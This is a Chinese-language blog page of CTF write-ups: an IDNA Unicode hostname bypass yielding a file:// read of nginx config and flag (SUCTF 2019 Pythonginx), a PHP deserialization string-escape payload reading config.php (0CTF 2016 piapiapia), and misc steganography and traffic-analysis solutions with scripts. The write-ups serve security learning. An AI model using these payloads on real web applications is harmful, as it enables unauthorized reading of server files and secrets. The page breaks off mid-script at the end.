<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/6/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-page-69" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/13/page-69/" class="article-date">
  <time class="dt-published" datetime="2021-07-13T08:58:41.000Z" itemprop="datePublished">2021-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/13/page-69/">SUCTF 2019 Pythonginx</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>这关主要是url中的unicode漏洞引发的域名安全问题</strong><br>1、域名欺骗 ：<br>访问此网站http://Вaidu.com(其中的В是unicode U+0412)<br>会跳转到<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a><br>也可以换成其他的unicode<br>访问http://Вaidu.com 时浏览器会将访问的url交给域名系统（DNS）解析url为ip地址<br>解析url过程用到递归查询和迭代查询 先递归搜索浏览器自己的dns缓存然后搜索操作系统的dns缓存 再搜索hosts文件缓存<br>搜索本地域名服务器 但后迭代搜索根域名服务器知道找到ip地址 找不到就是404<br>在DNS中idna使用punycode转写将ascii字符串存储，本地DNS中因为遇见特殊字符В 因此无法将其转成正常ascii<br>就直接在本地转化为<a target="_blank" rel="noopener" href="http://вaidu.com/">http://xn--aidu-f4d.com/</a></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/22.PNG?raw=true" alt="22.PNG"></p>
<p><strong>还有要知道ngix重要文件的位置</strong><br><strong>nginx重要文件的位置：</strong></p>
<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
<p>源码这边<br> @app.route(‘/getUrl’, methods=[‘GET’, ‘POST’])<br>def getUrl():<br>    url = request.args.get(“url”)<br>    host = parse.urlparse(url).hostname<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 111”<br>    parts = list(urlsplit(url))<br>    host = parts[1]<br>    if host == ‘suctf.cc’:<br>        return “我扌 your problem? 222 “ + host<br>    newhost = []<br>    for h in host.split(‘.’):<br>        newhost.append(h.encode(‘idna’).decode(‘utf-8’))<br>    parts[1] = ‘.’.join(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = urlunsplit(parts).split(‘ ‘)[0]<br>    host = parse.urlparse(finalUrl).hostname<br>    if host == ‘suctf.cc’:<br>        return urllib.request.urlopen(finalUrl).read()<br>    else:<br>        return “我扌 your problem? 333”<br>    </code><br>    <!-- Dont worry about the suctf.cc. Go on! --><br>    <!-- Do you know the nginx? --></p>
</body>
是要对host的判断然后绕过这两个判断
如果一开始就是suctf.cc压根就没办法 

<p><strong>需要访问suctf.cc/user/local/nginx/conf/nginx.conf</strong>  访问这个配置文件应该能找到flag 位置<br>跑脚本 </p>
<p>#coding:utf-8</p>
<p>for i in range(128,65537):<br>    tmp=chr(i)<br>    try:<br>        res = tmp.encode(‘idna’).decode(‘utf-8’)<br>        if(“-“) in res:<br>            continue<br>        print(“U:{}    A:{}      ascii:{} “.format(tmp, res, i))<br>    except:<br>        pass</p>
<p><strong>找到℆这么一个字符恰好会因为这个漏洞被解析成c/u 这样就能绕过</strong></p>
<p>构造file://suctf.c℆sr/local/nginx/conf/nginx.conf  也可以用ℂ 来替代c</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/23.PNG?raw=true" alt="23.PNG"></p>
<p>最终payload：</p>
<p>file://suctf.c℆sr/fffffflag</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/24.PNG?raw=true" alt="24.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/13/page-69/" data-id="ckuzhnezd0021v4w7fnbt9y45" data-title="SUCTF 2019 Pythonginx" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-68" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/13/page-68/" class="article-date">
  <time class="dt-published" datetime="2021-07-13T08:58:39.000Z" itemprop="datePublished">2021-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/13/page-68/">0CTF 2016piapiapia</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>一来就试了一下sql注入 无<br>然后<strong>找到一个register.php</strong> 的页面 那边有个上传 也无上传漏洞<br>dirsearch 添加延时参数 <strong>找到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong> 下载下来得到源码<br>拿到源码 <strong>class.php config.php index.php profile.php register.php update.php</strong><br><strong>config.php 那边有flag 从那边应该可以拿到flag</strong><br>update.php 这边正则匹配了 过滤提交的数据 但是判断nickname那边有长度限制可以用nickname的数组来绕过长度限制就不会die</p>
<p>png29 这边用到了serialize() 可以试一下反序列化</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/29.PNG?raw=true" alt="29.PNG"></p>
<p>前面<br>有个update_profile  到class.php 看一下update_profile  的定义方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再往下有个<strong>filter()</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>update()</strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>update.php 就先正则表达式将提交的参数值过滤 再序列化将非法字符替换成hacker<br>这反序列化还有文件读取       </p>
<p>  <strong>flag在config中</strong> 这边有序列化 过滤替换 反序列化 文件读取<br>就是反序列化字符逃逸  构造包含config.php的数据利用字符串逃逸 再在profile.php中读取得到<br>反序列化是以”;}结束的 把这个往前放置 就可以将反序列化提前结束的内容就丢弃了<br>突破口：<br> 反序列化字符逃逸，首先序列化的字符是可控的 前面的长度是可控的 但是update.php将参数序列化，可控变量的长度就被写死了<br>要控制得通过序列化后数据过滤替代那边</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>select insert update delete where替换成hacker  写入where替换成hacker 字符串长度+1 因此实际的长的都大于序列化固定长度<br>i:0;s:3:”123”;     -&gt; 就是类似于s:后面这个值           反序列化字符串的逃逸，反序列化只能将nickname的s长度反序列化成功其他的长度已经被写死了， 剩下的字符串 构造class.php因为里面包含了flag 并将其位置放到photo上然后将photo扔掉<br>这样profile.php 中读取的photo就是我么构造的config.php 就能拿到flag了<br>假设：</p>
<?php
//$a = array('123', 'abc', 'defg');
//var_dump(serialize($a));
//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
$a = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';
$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';
var_dump(unserialize($b));
var_dump(unserialize($b));
?><p>构造这样一个 defg会被丢弃qwert占了原本的位置<br>目的是将”;}s:5:photo;s:10:”config.php”;}  这串总共34位  插入到序列化的字符串中<br>hacker比where多一个字符那就得需要挤出34位 也就是34个where 上传后再去profile查看内容</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/30.PNG?raw=true" alt="30.PNG"></p>
<p>payload ：wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:photo;s:10:”config.php”;}</p>
<p>profile.php 那边查看源码 base64解码一下就可以了</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/31.PNG?raw=true" alt="31.PNG"></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/32.PNG?raw=true" alt="32.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/13/page-68/" data-id="ckuzhnezc001yv4w71y6t1b0z" data-title="0CTF 2016piapiapia" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-67" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/13/page-67/" class="article-date">
  <time class="dt-published" datetime="2021-07-13T08:35:42.000Z" itemprop="datePublished">2021-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/13/page-67/">misc</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>ACTF新生赛2020 outguess</strong></p>
<p>解压发现一大堆的文件但是大部分都没什么意义<br>flag.txt 打开后发现<br>flag在哪？<br>你Guess一下啊！这么一段话<br>猜测应该是图片隐写 要用到outguess<br>mmm.jpg的属性那边备注这么段信息</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/13.PNG?raw=true" alt="13.PNG"></p>
<p>有个叫什么社会主义核心价值观的加密<br>解码一下得到abc三个字母<br>那就没错了<br>就拿到flag了ACTF{gue33_Gu3Ss!2020}</p>
<p><strong>SWPU2019我有一只马里奥</strong></p>
<p>下载下来得到一个文件运行生成一个1.txt 打开提示如下<br>ntfs<br>flag.txt<br>应该是ntfs隐写<br>用ntfsstreamediter导出即可</p>
<p><strong>谁赢了比赛？</strong></p>
<p>丢010 发现还有压缩包<br>文件分离 得压缩包 暴力破解是个四位数密码<br>拿到一张gif 逐帧分析第310帧有不一样的 </p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/25.PNG?raw=true" alt="25.PNG"></p>
<p>用stegsolve red plane 0</p>
<p>那边得到一张二维码 扫一下就可以了</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/26.PNG?raw=true" alt="26.PNG"></p>
<p>**HBNIS2018excel破解 **<br>直接丢010 然后查找一下找到flag is here 就找到flag了 这么简单？</p>
<p><strong>ACTF新生赛2020 base64隐写</strong></p>
<p>base64隐写的原理：</p>
<p>从Base64编码的原理我们很自然推出Base64解码的过程：</p>
<p>丢掉末尾的所有‘=’；<br>每个字符查表转换为对应的6位索引，得到一串二进制字符串；<br>从头开始，每次取8位转换为对应的ASCII字符，如果不足8位则丢弃。<br>在解码的第3步中，会有部分数据被丢弃（即不会影响解码结果），这些数据正是我们在编码过程中补的0（本文第三第四张图中加粗的部分）。也就是说，如果我们在编码过程中不全用0填充，而是用其他的数据填充，仍然可以正常编码解码，因此这些位置可以用于隐写。</p>
<p>解开隐写的方法就是将这些不影响解码结果的位提取出来组成二进制串，然后转换成ASCII字符串。<br>依次读取每行，从中提取出隐写位。<br>如果最后没有‘=’，说明没有隐写位，跳过。<br>如果最后是一个‘=’，说明有两位隐写位，将倒数第二个字符转化为对应的二进制索引，然后取后两位。<br>如果最后是两个‘=’，说明有四位隐写位，将倒数第三个字符转化为对应的二进制索引，然后取后四位。<br>将每行提取出的隐写位依次连接起来，每8位为一组转换为ASCII字符，最后不足8位的丢弃。</p>
<p>贴一下解题脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inttobin</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    ret = <span class="built_in">bin</span>(a)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(ret) &lt; n:</span><br><span class="line">        ret = <span class="string">&#x27;0&#x27;</span> + ret</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;ComeOn!.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tmpbin = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">line = f.readline()</span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    <span class="keyword">if</span> line[-<span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> line[-<span class="number">3</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            tmpbin += inttobin(table.index(line[-<span class="number">4</span>]), <span class="number">6</span>)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmpbin += inttobin(table.index(line[-<span class="number">3</span>]), <span class="number">6</span>)[<span class="number">4</span>:]</span><br><span class="line">    line = f.readline()</span><br><span class="line">quotient = <span class="built_in">len</span>(tmpbin)/<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(quotient):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> res</span><br></pre></td></tr></table></figure>

<p>附一下base64编码解码脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inttobin</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    res = <span class="built_in">bin</span>(a)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(res) &lt; n:</span><br><span class="line">        res = <span class="string">&#x27;0&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64encode</span>(<span class="params">strin</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    quotient = <span class="built_in">len</span>(strin)/<span class="number">3</span></span><br><span class="line">    remainder = <span class="built_in">len</span>(strin)%<span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(quotient):</span><br><span class="line">        tmp = strin[i*<span class="number">3</span>:i*<span class="number">3</span>+<span class="number">3</span>]</span><br><span class="line">        tmpbin = inttobin(<span class="built_in">ord</span>(tmp[<span class="number">0</span>]), <span class="number">8</span>) + inttobin(<span class="built_in">ord</span>(tmp[<span class="number">1</span>]), <span class="number">8</span>) + inttobin(<span class="built_in">ord</span>(tmp[<span class="number">2</span>]), <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">print</span> tmpbin</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            index = <span class="built_in">int</span>(tmpbin[<span class="number">6</span>*j:<span class="number">6</span>*j+<span class="number">6</span>], <span class="number">2</span>)</span><br><span class="line">            res += table[index]</span><br><span class="line">    <span class="keyword">if</span> remainder == <span class="number">1</span>:</span><br><span class="line">        tmpbin = inttobin(<span class="built_in">ord</span>(strin[-<span class="number">1</span>]), <span class="number">8</span>) + <span class="string">&#x27;0000&#x27;</span></span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[:<span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[<span class="number">6</span>:], <span class="number">2</span>)]</span><br><span class="line">        res += <span class="string">&#x27;==&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> remainder == <span class="number">2</span>:</span><br><span class="line">        tmpbin = inttobin(<span class="built_in">ord</span>(strin[-<span class="number">2</span>]), <span class="number">8</span>) + inttobin(<span class="built_in">ord</span>(strin[-<span class="number">1</span>]), <span class="number">8</span>) + <span class="string">&#x27;00&#x27;</span></span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[:<span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[<span class="number">6</span>:<span class="number">12</span>], <span class="number">2</span>)]</span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[<span class="number">12</span>:], <span class="number">2</span>)]</span><br><span class="line">        res += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64decode</span>(<span class="params">strin</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> strin[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        strin = strin[:-<span class="number">1</span>]</span><br><span class="line">    tmpbin = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strin)):</span><br><span class="line">        tmpbin += inttobin(table.index(strin[i]), <span class="number">6</span>)</span><br><span class="line">    remainder = <span class="built_in">len</span>(tmpbin) / <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remainder):</span><br><span class="line">        res += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<p><strong>sqltest</strong><br>wireshark打开然后导出为http对象列表<br>png28<br>发现这在进行盲注bool注入的语句<br>推断出正确的ascii值，在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/28.PNG?raw=true" alt="28.PNG"></p>
<p>最后提取到：<br>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125<br>转为字符串得flag<br>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
<p><strong>GXYCTF2019 gakki</strong></p>
<p>老样子丢010 发现还有个压缩包 文件分离 暴力破解<br>然后拿到一个文本文档</p>
<p>#2V0VI_05X$GygD3<em>g@gYurMGim#1=)D_@Z(JcRevlyGq&amp;N-dgPH8XXSGL{@9}zVmlmxv1vEwbqr)ea!YMI2lznoV_bMrXLbwFrgaiQYfsVN14weObXp)(ybmXjXuTkFuj1pG54!mij1){41gKmFL&amp;Zgeho01PPEwE=r</em>csndRof$X7JBJ=CaNRGMjLY_-GiqlDHWaVk-XZ<em>8lD5!kLb(OH%8u2LtQXX3QV{1Lh)LyGF#kpV$}GXRKla)u(pw(&amp;ggmYU82HLWhJgngOjhwofkqqC{Hi)g!GXrY6=UQGvaeOIrVg</em>jkGjgGRTY78Ol$w0&amp;tzZ1t}z#<em>c^t8GrskRcz9YKE</em>)4B(U<br>一堆的乱七八糟的<br><strong>字频统计</strong>    脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* -coding:utf-8 -* -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Author: mochu7</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">	counts = strings.count(i)</span><br><span class="line">	i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">	<span class="built_in">print</span>(flag[<span 